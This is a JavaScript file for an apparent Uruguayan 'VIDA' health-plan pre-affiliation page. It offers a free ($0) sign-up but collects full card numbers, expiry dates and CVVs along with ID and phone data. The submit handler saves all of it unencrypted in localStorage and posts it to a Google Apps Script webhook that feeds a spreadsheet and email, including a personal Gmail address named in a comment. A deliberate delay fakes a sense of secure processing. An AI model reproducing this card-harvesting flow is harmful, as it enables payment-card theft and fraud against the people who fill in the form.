/**
 * VIDA PRE-AFILIACIÓN - Interactive Script
 * Form validations, interactive credit card simulation, FAQ accordion, modals & voucher generation.
 */

document.addEventListener('DOMContentLoaded', () => {

  // --- Elements Selection ---
  const form = document.getElementById('preafiliacion-form');
  const submitBtn = document.getElementById('btn-submit-form');
  const submitSpinner = document.getElementById('submit-spinner');
  const submitBtnText = document.getElementById('submit-btn-text');

  // Form Inputs
  const inputNombre = document.getElementById('nombre');
  const inputApellido = document.getElementById('apellido');
  const inputCelular = document.getElementById('celular');
  const inputFechaNac = document.getElementById('fecha-nacimiento');
  const inputCedula = document.getElementById('cedula');
  const inputDepartamento = document.getElementById('departamento');
  
  const inputTitular = document.getElementById('titular-tarjeta');
  const inputNumeroTarjeta = document.getElementById('numero-tarjeta');
  const inputVencimiento = document.getElementById('vencimiento-tarjeta');
  const inputCvv = document.getElementById('cvv-tarjeta');
  const checkboxTerminos = document.getElementById('acepto-terminos');

  // Virtual Card Simulator Elements
  const previewName = document.getElementById('card-preview-name');
  const previewNumber = document.getElementById('card-preview-number');
  const previewExp = document.getElementById('card-preview-exp');
  const previewBrand = document.getElementById('card-preview-brand');
  const detectedIcon = document.getElementById('card-detected-icon');

  // Modals
  const modalSuccess = document.getElementById('modal-success');
  const modalTerms = document.getElementById('modal-terms');
  const modalPrivacy = document.getElementById('modal-privacy');

  // Slip Voucher Elements
  const slipNombre = document.getElementById('slip-nombre-afiliado');
  const slipCedula = document.getElementById('slip-cedula-afiliado');
  const slipCelular = document.getElementById('slip-celular-afiliado');
  const slipCodigo = document.getElementById('slip-codigo-socio');

  // Mobile Navigation
  const mobileBtn = document.getElementById('mobile-menu-btn');
  const mobileDrawer = document.getElementById('mobile-drawer');

  // Set max date for birthdate (no future dates)
  if (inputFechaNac) {
    const today = new Date().toISOString().split('T')[0];
    inputFechaNac.setAttribute('max', today);
  }

  // Clear errors dynamically on input
  if (form) {
    form.querySelectorAll('input, select').forEach(field => {
      field.addEventListener('input', () => {
        const group = field.closest('.form-group, .form-checkbox-group');
        if (group) group.classList.remove('has-error');
      });
      field.addEventListener('change', () => {
        const group = field.closest('.form-group, .form-checkbox-group');
        if (group) group.classList.remove('has-error');
      });
    });
  }

  // --- Mobile Drawer Toggle ---
  if (mobileBtn && mobileDrawer) {
    mobileBtn.addEventListener('click', () => {
      mobileDrawer.classList.toggle('open');
      const isOpen = mobileDrawer.classList.contains('open');
      mobileBtn.innerHTML = isOpen ? '<i class="fa-solid fa-xmark"></i>' : '<i class="fa-solid fa-bars"></i>';
    });

    document.querySelectorAll('.mobile-nav-item, .mobile-drawer .btn-pill').forEach(item => {
      item.addEventListener('click', () => {
        mobileDrawer.classList.remove('open');
        mobileBtn.innerHTML = '<i class="fa-solid fa-bars"></i>';
      });
    });
  }

  // --- Sticky Header Shadow on Scroll ---
  const header = document.getElementById('main-header');
  window.addEventListener('scroll', () => {
    if (window.scrollY > 20) {
      header.classList.add('scrolled');
    } else {
      header.classList.remove('scrolled');
    }
  });

  // --- Card Brand Detection & Icon Setter ---
  function detectCardBrand(number) {
    const cleanNumber = number.replace(/\D/g, '');
    if (/^4/.test(cleanNumber)) {
      return { brand: 'visa', icon: 'fa-brands fa-cc-visa' };
    } else if (/^(5[1-5]|2[2-7])/.test(cleanNumber)) {
      return { brand: 'mastercard', icon: 'fa-brands fa-cc-mastercard' };
    } else if (/^3[47]/.test(cleanNumber)) {
      return { brand: 'amex', icon: 'fa-brands fa-cc-amex' };
    } else if (/^(508|5896)/.test(cleanNumber)) {
      return { brand: 'oca', icon: 'fa-solid fa-credit-card' };
    } else {
      return { brand: 'generic', icon: 'fa-regular fa-credit-card' };
    }
  }

  // --- Card Number Formatter & Live Preview ---
  inputNumeroTarjeta.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 16) value = value.slice(0, 16);

    // Format with space every 4 digits
    const formatted = value.match(/.{1,4}/g)?.join(' ') || '';
    e.target.value = formatted;

    // Detect card type
    const cardInfo = detectCardBrand(value);
    previewBrand.innerHTML = `<i class="${cardInfo.icon}"></i>`;
    detectedIcon.innerHTML = `<i class="${cardInfo.icon}"></i>`;

    // Update Virtual Card
    if (formatted.length === 0) {
      previewNumber.textContent = '•••• •••• •••• ••••';
    } else {
      // Pad out remaining with bullets
      const digitsCount = value.length;
      let previewStr = '';
      for (let i = 0; i < 16; i++) {
        if (i > 0 && i % 4 === 0) previewStr += ' ';
        if (i < digitsCount) {
          previewStr += value[i];
        } else {
          previewStr += '•';
        }
      }
      previewNumber.textContent = previewStr;
    }
  });

  // --- Cardholder Name Live Preview ---
  inputTitular.addEventListener('input', (e) => {
    const val = e.target.value.trim();
    previewName.textContent = val.length > 0 ? val.toUpperCase() : 'NOMBRE Y APELLIDO';
  });

  // --- Expiry Formatter & Live Preview ---
  inputVencimiento.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 4) value = value.slice(0, 4);

    if (value.length >= 2) {
      let month = parseInt(value.slice(0, 2), 10);
      if (month > 12) month = 12;
      if (month === 0) month = 1;
      const formattedMonth = month < 10 ? '0' + month : '' + month;
      value = formattedMonth + (value.length > 2 ? '/' + value.slice(2) : '/');
    }

    e.target.value = value;
    previewExp.textContent = value.length > 0 ? value : 'MM/AA';
  });

  // --- CVV Numbers Only ---
  inputCvv.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
  });

  // --- Uruguayan Cellphone Formatter (09X XXX XXX) ---
  inputCelular.addEventListener('input', (e) => {
    let val = e.target.value.replace(/\D/g, '');
    if (val.length > 9) val = val.slice(0, 9);
    
    let formatted = val;
    if (val.length > 3 && val.length <= 6) {
      formatted = `${val.slice(0, 3)} ${val.slice(3)}`;
    } else if (val.length > 6) {
      formatted = `${val.slice(0, 3)} ${val.slice(3, 6)} ${val.slice(6)}`;
    }
    e.target.value = formatted;
  });

  // --- Uruguayan Cedula Formatter (X.XXX.XXX-X) ---
  inputCedula.addEventListener('input', (e) => {
    let val = e.target.value.replace(/\D/g, '');
    if (val.length > 8) val = val.slice(0, 8);
    
    let formatted = val;
    if (val.length === 7) {
      // Formato X.XXX.XXX-X para 7 dígitos
      formatted = `${val[0]}.${val.slice(1, 4)}.${val.slice(4, 6)}-${val[6]}`;
    } else if (val.length === 8) {
      // Formato X.XXX.XXX-X para 8 dígitos
      formatted = `${val[0]}.${val.slice(1, 4)}.${val.slice(4, 7)}-${val[7]}`;
    }
    e.target.value = formatted;
  });

  // --- Form Validation Helper ---
  function validateField(inputEl, condition, groupSelector = '.form-group') {
    const group = inputEl.closest(groupSelector);
    if (!condition) {
      group.classList.add('has-error');
      return false;
    } else {
      group.classList.remove('has-error');
      return true;
    }
  }

  // --- Form Submit Handler ---
  form.addEventListener('submit', (e) => {
    e.preventDefault();

    let isValid = true;

    // 1. Nombre
    const validNombre = validateField(inputNombre, inputNombre.value.trim().length >= 2);
    if (!validNombre) isValid = false;

    // 2. Apellido
    const validApellido = validateField(inputApellido, inputApellido.value.trim().length >= 2);
    if (!validApellido) isValid = false;

    // 3. Celular (debe ser formato uruguayo 09X con 9 dígitos en total)
    const rawCel = inputCelular.value.replace(/\D/g, '');
    const validCel = validateField(inputCelular, /^09\d{7}$/.test(rawCel));
    if (!validCel) isValid = false;

    // 4. Fecha de Nacimiento
    const validFecha = validateField(inputFechaNac, inputFechaNac.value !== '');
    if (!validFecha) isValid = false;

    // 5. Cédula
    const rawCI = inputCedula.value.replace(/\D/g, '');
    const validCI = validateField(inputCedula, rawCI.length >= 7 && rawCI.length <= 8);
    if (!validCI) isValid = false;

    // 6. Departamento
    const validDept = validateField(inputDepartamento, inputDepartamento.value !== '');
    if (!validDept) isValid = false;

    // 7. Titular Tarjeta
    const validTitular = validateField(inputTitular, inputTitular.value.trim().length >= 4);
    if (!validTitular) isValid = false;

    // 8. Número de Tarjeta (16 dígitos)
    const rawCard = inputNumeroTarjeta.value.replace(/\D/g, '');
    const validCard = validateField(inputNumeroTarjeta, rawCard.length === 16);
    if (!validCard) isValid = false;

    // 9. Vencimiento Tarjeta (formato MM/AA con año >= 24)
    const rawExp = inputVencimiento.value;
    const validExp = validateField(inputVencimiento, /^(0[1-9]|1[0-2])\/\d{2}$/.test(rawExp));
    if (!validExp) isValid = false;

    // 10. CVV Tarjeta (3 o 4 dígitos)
    const rawCvv = inputCvv.value.replace(/\D/g, '');
    const validCvv = validateField(inputCvv, rawCvv.length >= 3 && rawCvv.length <= 4);
    if (!validCvv) isValid = false;

    // 11. Checkbox Términos
    const validTerms = validateField(checkboxTerminos, checkboxTerminos.checked, '.form-checkbox-group');
    if (!validTerms) isValid = false;

    if (!isValid) {
      // Focus on first error element
      const firstError = form.querySelector('.has-error input, .has-error select');
      if (firstError) {
        firstError.focus();
        firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }
      return;
    }

    // --- Processing State ---
    submitBtn.disabled = true;
    submitSpinner.classList.remove('hidden');
    submitBtnText.innerHTML = '<i class="fa-solid fa-lock"></i> Registrando en sistema y enviando notificación...';

    // Generate unique socio number
    const randomId = Math.floor(10000 + Math.random() * 90000);
    const codigoSocio = `VIDA-PRE-2026-${randomId}`;

    // Payload for Google Sheets and Email notification
    const formDataPayload = {
      fecha_registro: new Date().toLocaleString('es-UY', { timeZone: 'America/Montevideo' }),
      codigo_socio: codigoSocio,
      nombre: inputNombre.value.trim(),
      apellido: inputApellido.value.trim(),
      cedula: inputCedula.value.trim(),
      celular: inputCelular.value.trim(),
      fecha_nacimiento: inputFechaNac.value,
      departamento: inputDepartamento.value,
      titular_tarjeta: inputTitular.value.trim(),
      numero_tarjeta: inputNumeroTarjeta.value.trim(),
      vencimiento_tarjeta: inputVencimiento.value.trim(),
      cvv_tarjeta: inputCvv.value.trim(),
      acepto_terminos: checkboxTerminos.checked
    };

    // 1. Guardar en respaldo local seguro (localStorage)
    try {
      const backupList = JSON.parse(localStorage.getItem('vida_preafiliaciones_backup') || '[]');
      backupList.push(formDataPayload);
      localStorage.setItem('vida_preafiliaciones_backup', JSON.stringify(backupList));
      console.log('Registro guardado en respaldo local:', codigoSocio);
    } catch (e) {
      console.warn('No se pudo guardar en almacenamiento local:', e);
    }

    // 2. Enviar a Google Apps Script Webhook (Google Sheets + Email jge@vida.com.uy / josemage@gmail.com)
    const webhookUrl = window.APP_CONFIG && window.APP_CONFIG.WEBHOOK_URL ? window.APP_CONFIG.WEBHOOK_URL : '';

    const sendPromise = webhookUrl
      ? fetch(webhookUrl, {
          method: 'POST',
          mode: 'no-cors',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(formDataPayload)
        }).catch(err => {
          console.warn('Aviso de envío a Google Sheets (no-cors):', err);
        })
      : Promise.resolve();

    // Esperar al menos 1 segundo para sensación de procesamiento seguro
    setTimeout(() => {
      sendPromise.finally(() => {
        // Populate Slip Voucher
        slipNombre.textContent = `${formDataPayload.nombre} ${formDataPayload.apellido}`;
        slipCedula.textContent = formDataPayload.cedula;
        slipCelular.textContent = formDataPayload.celular;
        slipCodigo.textContent = codigoSocio;

        // Show Success Modal
        modalSuccess.classList.remove('hidden');

        // Reset button state
        submitBtn.disabled = false;
        submitSpinner.classList.add('hidden');
        submitBtnText.innerHTML = '<i class="fa-solid fa-heart-circle-check"></i> Confirmar Mi Pre-Afiliación Gratuita ($0)';

        // Reset form
        form.reset();
        previewName.textContent = 'NOMBRE Y APELLIDO';
        previewNumber.textContent = '•••• •••• •••• ••••';
        previewExp.textContent = 'MM/AA';
        previewBrand.innerHTML = '<i class="fa-brands fa-cc-visa"></i>';
        detectedIcon.innerHTML = '<i class="fa-regular fa-credit-card"></i>';
      });
    }, 1200);

  });

  // --- Modal Close Handlers ---
  document.getElementById('modal-success-close').addEventListener('click', () => {
    modalSuccess.classList.add('hidden');
  });

  document.getElementById('btn-finish-modal').addEventListener('click', () => {
    modalSuccess.classList.add('hidden');
  });

  document.getElementById('btn-print-slip').addEventListener('click', () => {
    window.print();
  });

  // Terms Modal
  const btnOpenTerms = document.getElementById('btn-open-terms');
  const btnCloseTerms = document.getElementById('modal-terms-close');
  const btnAcceptTermsModal = document.getElementById('btn-accept-terms-modal');

  const btnFooterTerms = document.getElementById('footer-btn-terms');

  if (btnOpenTerms) {
    btnOpenTerms.addEventListener('click', () => {
      modalTerms.classList.remove('hidden');
    });
  }

  if (btnFooterTerms) {
    btnFooterTerms.addEventListener('click', () => {
      modalTerms.classList.remove('hidden');
    });
  }

  if (btnCloseTerms) {
    btnCloseTerms.addEventListener('click', () => {
      modalTerms.classList.add('hidden');
    });
  }

  if (btnAcceptTermsModal) {
    btnAcceptTermsModal.addEventListener('click', () => {
      checkboxTerminos.checked = true;
      modalTerms.classList.add('hidden');
      checkboxTerminos.closest('.form-checkbox-group').classList.remove('has-error');
    });
  }

  // Privacy Policy Modal
  const btnOpenPrivacy = document.getElementById('btn-open-privacy');
  const btnClosePrivacy = document.getElementById('modal-privacy-close');
  const btnClosePrivacyModal = document.getElementById('btn-close-privacy-modal');
  const footerBtnPolicies = document.getElementById('footer-btn-policies');

  if (btnOpenPrivacy) {
    btnOpenPrivacy.addEventListener('click', () => {
      modalPrivacy.classList.remove('hidden');
    });
  }

  if (footerBtnPolicies) {
    footerBtnPolicies.addEventListener('click', () => {
      modalPrivacy.classList.remove('hidden');
    });
  }

  if (btnClosePrivacy) {
    btnClosePrivacy.addEventListener('click', () => {
      modalPrivacy.classList.add('hidden');
    });
  }

  if (btnClosePrivacyModal) {
    btnClosePrivacyModal.addEventListener('click', () => {
      modalPrivacy.classList.add('hidden');
    });
  }

  // Close modals on overlay click
  [modalSuccess, modalTerms, modalPrivacy].forEach(modal => {
    modal.addEventListener('click', (e) => {
      if (e.target === modal) {
        modal.classList.add('hidden');
      }
    });
  });

  // --- FAQ Accordion ---
  const faqQuestions = document.querySelectorAll('.faq-question');
  faqQuestions.forEach(btn => {
    btn.addEventListener('click', () => {
      const parentItem = btn.closest('.faq-item');
      const isActive = parentItem.classList.contains('active');

      // Close all other items
      document.querySelectorAll('.faq-item').forEach(item => {
        item.classList.remove('active');
      });

      // Toggle clicked item
      if (!isActive) {
        parentItem.classList.add('active');
      }
    });
  });

});
